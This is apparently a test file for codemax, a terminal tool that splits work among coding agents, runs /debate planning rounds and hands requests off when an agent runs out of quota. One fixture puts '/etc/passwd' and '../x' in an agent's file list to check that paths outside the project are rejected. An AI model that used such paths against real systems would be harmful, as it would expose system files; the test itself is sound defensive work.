  for (const no of ["run the tests in parallel", "split the function into two", "let's work together on this file", "ask codex what it thinks", "/team build it", "why does the delegate pattern leak here?", "the team page has a bug", "fix the claude adapter", "split the claude and codex engine tests into two files", "run the claude and codex tests in parallel", "why does the delegate in the claude adapter leak", "the delegate object forwards to cursor.ts", "[codemax checks] failed: delegate the tests to codex"]) expect([no, !!teamIntent(no)]).toEqual([no, false]);
  expect(teamIntent("split this between claude and codex")!.named).toEqual(["claude", "codex"]);
  const d = await import("../src/core/debuglog.ts");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  const h = await harness(async (text, ctx) => ctx.say(`did: ${text.slice(0, 60)}`));
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  try {
    await h.send("split this between claude and codex: build the parser");
    const f = await h.frame((f) => f.includes("Share this out among a team?"));
    expect(f).toContain("1. Claude Code");
    expect(f).toContain("2. Codex");
    expect(h.prompts.length).toBe(0);   // nothing sent yet
    h.setup.mockInput.pressEscape();
    await h.frame((f) => f.includes("did: split this between claude and codex"));
    expect(h.prompts).toEqual(["split this between claude and codex: build the parser"]);
    const log = readFileSync(d.debugLogPath(), "utf8");
    expect(log).toContain('"kind":"team-intent"');
    expect(log).toContain('"kind":"team-intent-declined"');
    // /config → When a message asks to delegate → send it as it is.
    (h.app as any).config.teamOffer = false;
    await h.send("delegate the docs to codex");
    await h.frame((f) => f.includes("did: delegate the docs to codex"));
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 30000);

test("team: the split is read from the lead's reply; shared files and paths outside the project are caught", async () => {
  const { parseSplit, splitOverlaps, workerPrompt, teamCost } = await import("../src/core/team.ts");
  const reply = 'Here.\n```json\n{"parts":[{"title":"api","files":["src/api/","./src/routes.ts","/etc/passwd","../x"],"task":"build the api"},{"title":"ui","files":["src/ui/"],"task":"build the ui"},{"title":"extra","files":["docs/"],"task":"write docs"},{"title":"empty","files":[],"task":""}]}\n```';
  const parts = parseSplit(reply, 2)!;
  expect(parts.map((p) => p.title)).toEqual(["api", "ui"]);   // no more parts than workers
  expect(parts[0]!.files).toEqual(["src/api/", "src/routes.ts"]);
  expect(parseSplit("I cannot split this.", 3)).toBeNull();
  expect(parseSplit('{"parts": [{"title": "one", "files": ["a.ts"], "task": "all of it"}]}', 3)!.length).toBe(1);
  expect(splitOverlaps(parts)).toEqual([]);
  expect(splitOverlaps([{ title: "a", files: ["src/api/"], task: "x" }, { title: "b", files: ["src/api/users.ts", "src/ui"], task: "y" }, { title: "c", files: ["src/ui/app.ts"], task: "z" }])).toEqual(["src/api/users.ts", "src/ui/app.ts"]);
  const brief = workerPrompt("ship it", parts, 1, [{ name: "Claude Code" }, { name: "Codex" }]);
  expect(brief).toContain("YOUR PART: ui");
  expect(brief).toContain("Change only your files: src/ui/");
  expect(brief).toContain("1. api (Claude Code): src/api/, src/routes.ts");
  expect(teamCost(3)).toContain("5 agent turns");
});

test("/debate: agents on models you choose each propose, argue, and a judge's merged plan goes to your agent", async () => {
  const models: ModelOpts = { list: [{ modelId: "big-5-5", name: "Big 5.5" }, { modelId: "small-4", name: "Small 4" }], set: [] };
  const seen: { agent?: string; text: string }[] = [];
  const h = await harness(async (text, ctx) => {
    seen.push({ agent: ctx.agent, text });
    if (text.includes("You are now the judge")) return ctx.say("1. Agree on tests.\n2. Cache: Codex wins.\n3. THE PLAN\n1. add a cache\n2. test it\n4. Risks: none");
    if (text.includes("## Your answer") && text.includes("Critique")) return ctx.say(`${ctx.agent} critiques and revises: REVISED-${ctx.agent}`);
    if (text.includes("[codemax debate]")) {
      // A debater that tries to change something is refused.
      const r: any = await ctx.conn.requestPermission({ sessionId: ctx.sessionId, toolCall: { toolCallId: `w-${ctx.agent}`, title: "Write cache.ts", kind: "edit" }, options: [{ optionId: "ok", name: "Allow", kind: "allow_once" }, { optionId: "no", name: "Deny", kind: "reject_once" }] } as any);
      return ctx.say(`PLAN-${ctx.agent} (write was ${r.outcome.optionId})`);
    }
    await ctx.say(`main got: ${text.slice(0, 60)}`);
  }, { models, height: 40 });
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  const pick = async (filter: string, until: string) => {
    await h.setup.mockInput.typeText(filter);
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    return h.frame((f) => f.includes(until), 10000);
  };
  try {
    await h.send("/debate add caching to the API");
    let f = await h.frame((f) => f.includes("Debate: who argues?"));
    expect(f).toContain("1. Claude Code");
    await pick("add", "Which agent?");
    await pick("codex", "Model on Codex");
    f = await pick("small", "2. Codex · Small 4");
    await pick("start", "verdict · Claude Code merges");
    f = await h.frame((f) => f.includes("The debate agreed on a plan"), 20000);
    // Round 1: both proposed; the write each tried was refused.
    const proposals = seen.filter((x) => x.text.includes("plan as numbered steps"));
    expect(proposals.map((x) => x.agent).sort()).toEqual(["claude", "codex"]);
    expect(f).toContain("refused (a debate only plans)");
    // Round 2: each saw the other's plan, not its own.
    const claudeCritique = seen.find((x) => x.agent === "claude" && x.text.includes("Critique"))!;
    expect(claudeCritique.text).toContain("PLAN-codex (write was no)");
    expect(claudeCritique.text).not.toContain("## Claude Code's plan");
    // Codex debated on the model you chose.
    expect(models.set).toContainEqual({ agent: "codex", modelId: "small-4" });
    // The verdict's plan goes to your agent.
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("main got:"), 10000);
    expect(h.prompts.at(-1)).toContain("Carry out this plan, agreed in a debate between Claude Code, Codex · Small 4");
    expect(h.prompts.at(-1)).toContain("1. add a cache\n2. test it");
  } finally { await h.cleanup(); }
}, 40000);

test("/debate until the judge is satisfied: rounds go on while the judge says what is still open, and stop at SETTLED", async () => {
  const { parseSettled } = await import("../src/core/debate.ts");
  expect(parseSettled("SETTLED\nCodex's cache wins.")).toEqual({ settled: true });
  expect(parseSettled("**CONTINUE:** where the cache lives")).toEqual({ settled: false, focus: "where the cache lives" });
  expect(parseSettled("I think it is mostly fine")).toEqual({ settled: true }); // unclear: never loops
  let checks = 0;
  const seen: { agent?: string; text: string }[] = [];
  const h = await harness(async (text, ctx) => {
    seen.push({ agent: ctx.agent, text });
    if (text.includes("decide whether it is settled")) return ctx.say(++checks === 1 ? "CONTINUE: where the cache lives" : "SETTLED\nthe in-memory cache wins");
    if (text.includes("You are now the judge")) return ctx.say("3. THE PLAN\n1. in-memory cache\n4. Risks: none");
    if (text.includes("Critique")) return ctx.say(`REVISED-${ctx.agent}`);
    if (text.includes("[codemax debate]")) return ctx.say(`PLAN-${ctx.agent}`);
    await ctx.say("main got it");
  }, { height: 40 });
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  const pick = async (filter: string, until: string) => {
    await h.setup.mockInput.typeText(filter);
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    return h.frame((f) => f.includes(until), 10000);
  };
  try {
    await h.send("/debate cache the API");
    await h.frame((f) => f.includes("Debate: who argues?"));
    await pick("add", "Which agent?");
    await pick("codex", "2. Codex");
    // Rounds: 1 → 2 → 3 → 5 → until the judge is satisfied.
    for (const want of ["2 argument rounds", "3 argument rounds", "5 argument rounds", "until the judge is satisfied"]) await pick("rounds", `Rounds: ${want}`);
    const f = await h.frame((f) => f.includes("up to"));
    expect(f).toMatch(/until the judge finds the better plan: \d+ turns or more, up to \d+/);
    await pick("start", "settled after 2 argument rounds");
    await h.frame((f) => f.includes("The debate agreed on a plan"), 20000);
    expect(checks).toBe(2);
    // Round 3 argued what the judge said was open.
    const round3 = seen.filter((x) => x.text.includes("Critique") && x.text.includes("Round 3"));
    expect(round3.length).toBe(2);
    expect(round3[0]!.text).toContain("still open; argue them first: where the cache lives");
  } finally { await h.cleanup(); }
}, 40000);

test("the empty prompt shows a different feature tip after each message, skipping ones this setup can't use", async () => {
  const { TIPS, nextTip } = await import("../src/chat/tips.ts");
  const one = { agents: 1, checks: false, hotkey: "ctrl+^" };
  const seen = new Set<string>();
  let i = 0;
  for (let k = 0; k < TIPS.length; k++) {
    const t = nextTip(i, one);
    i = t.index;
    seen.add(t.text);
  }
  expect([...seen].some((t) => t.includes("/debate"))).toBe(false); // needs two agents
  expect([...seen].some((t) => t.includes("/verify"))).toBe(false); // needs a check command
  expect(nextTip(TIPS.findIndex((t) => t.text.includes("/debate")) - 1, { agents: 2, checks: true, hotkey: "ctrl+^" }).text).toBe("Tip: /debate <goal> · 2-3 agents argue out a plan before anything is built · / for commands");
  const h = await harness(async (_t, ctx) => ctx.say("ok"));
  try {
    expect(h.setup.captureCharFrame()).toContain('❯ Try "fix the failing test"');
    await h.send("first");
    await h.frame((f) => /❯ Tip: /.test(f));
    const tipA = (h.app as any).input.placeholder;
    await h.frame((f) => f.includes("ok"));
    await h.send("second");
    await h.frame(() => (h.app as any).input.placeholder !== tipA);
    expect((h.app as any).input.placeholder).toMatch(/^Tip: /); // long tips drop "· / for commands" to fit
  } finally { await h.cleanup(); }
}, 20000);

test("the prompt keeps the keyboard: after it loses focus (a click elsewhere), the next keys still type into it", async () => {
  const h = await harness(async (_t, ctx) => ctx.say("ok"));
  try {
    const input = (h.app as any).input;
    input.blur();
    expect(input.focused).toBe(false);
    await h.setup.mockInput.typeText("hello");
    await h.frame(() => input.plainText === "hello");
    expect(input.focused).toBe(true);
  } finally { await h.cleanup(); }
}, 20000);

test("Ctrl+G edits the message in your editor; /copy copies the last reply; /export saves the conversation as Markdown", async () => {
  const h = await harness(async (text, ctx) => ctx.say(`reply to ${text.split("\n")[0]}`));
  const copied: string[] = [];
  (h.app as any).copyText = async (t: string) => (copied.push(t), true);
  // A stand-in editor that appends to the file it is given.
  (h.app as any).editorCommand = () => (process.platform === "win32" ? "echo  and more>>" : "printf ' and more' >>");
  try {
    await h.setup.mockInput.typeText("draft");
    h.setup.mockInput.pressKey("g", { ctrl: true });
    await h.frame(() => (h.app as any).input.plainText === "draft and more", 10000);
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("reply to draft and more"));
    await h.send("/copy");
    await h.frame((f) => f.includes("copied the last reply"));
    expect(copied).toEqual(["reply to draft and more"]);
    const target = join(mkdtempSync(join(tmpdir(), "codemax-export-")), "chat.md");
    await h.send(`/export ${target}`);
    await h.frame((f) => f.includes("exported this conversation"));
    const md = readFileSync(target, "utf8");
    expect(md).toContain(`# codemax conversation ${h.app.threadId}`);
    expect(md).toContain("## You");
    expect(md).toContain("draft and more");
    expect(md).toContain("### Claude Code");
    expect(md).toContain("reply to draft and more");
  } finally { await h.cleanup(); }
}, 30000);

test("Antigravity /model: Gemini models to pick, and the Claude / GPT models only its own app offers, greyed with where to get them", async () => {
  const models: ModelOpts = { list: [{ modelId: "gemini-3.8-flash-high", name: "Gemini 3.8 Flash (High)" }, { modelId: "gemini-3.8-flash-low", name: "Gemini 3.8 Flash (Low)" }], set: [] };
  const h = await harness(async (_t, ctx) => ctx.say("ok"), {
    agent: "antigravity",
    models,
    height: 34,
    prep: (app) => { app.agyOnly = async () => [{ id: "claude-sonnet-4-6", name: "Claude Sonnet 4.6 (Thinking)" }, { id: "gpt-oss-120b-medium", name: "GPT-OSS 120B (Medium)" }]; },
  });
  try {
    await h.send("/model");
    const f = await h.frame((f) => f.includes("Model for") && f.includes("Claude Sonnet 4.6 (Thinking)"));
    expect(f).toContain("Gemini 3.8 Flash (High)");
    expect(f).toContain("GPT-OSS 120B (Medium)");
    expect(f).toContain("codemax --tui --agent antigravity");
    // A greyed model cannot be picked.
    await h.setup.mockInput.typeText("claude");
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    await Bun.sleep(200);
    expect(models.set).toEqual([]);
  } finally { await h.cleanup(); }
}, 20000);

test("bug fixes: a message sent while the agent starts waits for it (no stuck agent); queued messages keep their own dropped images; Ctrl+C leaves the setup", async () => {
  const h = await harness(async (text, ctx) => ctx.say(`got ${text.split("\n")[0]}`), {
    prep: (app) => {
      const make = app.engineFactory;
      app.engineFactory = (a: string) => {
        const e = make(a);
        const start = e.start.bind(e);
        e.start = async (o: any) => (await Bun.sleep(300), start(o));
        return e;
      };
    },
  });
  try {
    // Start a new session and type at once, while it is still starting.
    void (h.app as any).launch("claude", { fresh: true });
    await Bun.sleep(30);
    await h.send("hello while starting");
    await h.frame((f) => f.includes("got hello while starting"), 10000);
    expect((h.app as any).active.turn).toBeNull();
    // Two queued messages, each with its own image.
    const app: any = h.app;
    const png = join(mkdtempSync(join(tmpdir(), "codemax-drop2-")), "a.png");
    writeFileSync(png, "x");
    const one = app.dropFile(png), two = app.dropFile(png);
    expect([one, two]).toEqual(["[Image #1]", "[Image #2]"]);
    expect(app.takeDropped(`first ${one}`).images.length).toBe(1);
    expect(app.takeDropped(`second ${two}`).images.length).toBe(1); // used to be dropped with the first
  } finally { await h.cleanup(); }

  const { CONFIG_PATH, saveConfigKey } = await import("../src/config.ts");
  saveConfigKey("onboarded", false); // an earlier test in this file finished its setup
  const s = await harness(async (_t, ctx) => ctx.say("ok"), { onboard: true });
  try {
    s.setup.mockInput.pressKey("c", { ctrl: true });
    await (s.app as any).done; // the quit finished (codemax closes the screen only after that)
    expect((s.app as any).closed).toBe(true);
    // Not marked done: it comes back next time.
    expect(existsSync(CONFIG_PATH) ? JSON.parse(readFileSync(CONFIG_PATH, "utf8")).onboarded : undefined).not.toBe(true);
  } finally {
    try { s.setup.renderer.destroy(); } catch { /* already gone with the quit */ }
  }
}, 30000);

test("Cursor's 'Upgrade your plan to continue' mid-task hands the request to the next agent automatically, keeping the work done before it", async () => {
  const h = await harness(async (text, ctx) => {
    if (ctx.agent === "cursor") return ctx.say("I fixed the parser and ran half the tests.\n\nUpgrade your plan to continue");
    await ctx.say(`${ctx.agent} did it: ${text.slice(0, 40)}`);
  }, { cfg: { autoHandoff: true, order: ["cursor", "opencode"] }, agent: "cursor" });
  (h.app as any).detect.set("opencode", { installed: true, version: "t", engine: true });
  try {
    await h.send("finish the parser");
    const f = await h.frame((f) => f.includes("opencode did it"), 15000);
    expect(f).toContain("handing off to OpenCode");
    expect(h.prompts.at(-1)).toContain("finish the parser"); // the unfinished request went along
    const saved = h.ledger.turns().filter((t: any) => t.role === "assistant" && t.agent === "cursor");
    expect(saved.map((t: any) => t.text)).toEqual(["I fixed the parser and ran half the tests."]); // the work stays, the notice is not an answer
  } finally { await h.cleanup(); }
}, 30000);

test("with the offer setting, Cursor's limit shows the handoff offer instead", async () => {
  const h = await harness(async (_text, ctx) => (ctx.agent === "cursor" ? ctx.say("Upgrade your plan to continue") : ctx.say("ok")), { cfg: { autoHandoff: false, order: ["cursor", "opencode"] }, agent: "cursor" });
  (h.app as any).detect.set("opencode", { installed: true, version: "t", engine: true });
  try {
    await h.send("do it");
    const f = await h.frame((f) => f.includes("Enter to continue in OpenCode"), 15000);
    expect(f).toContain("out of quota");
  } finally { await h.cleanup(); }
}, 30000);
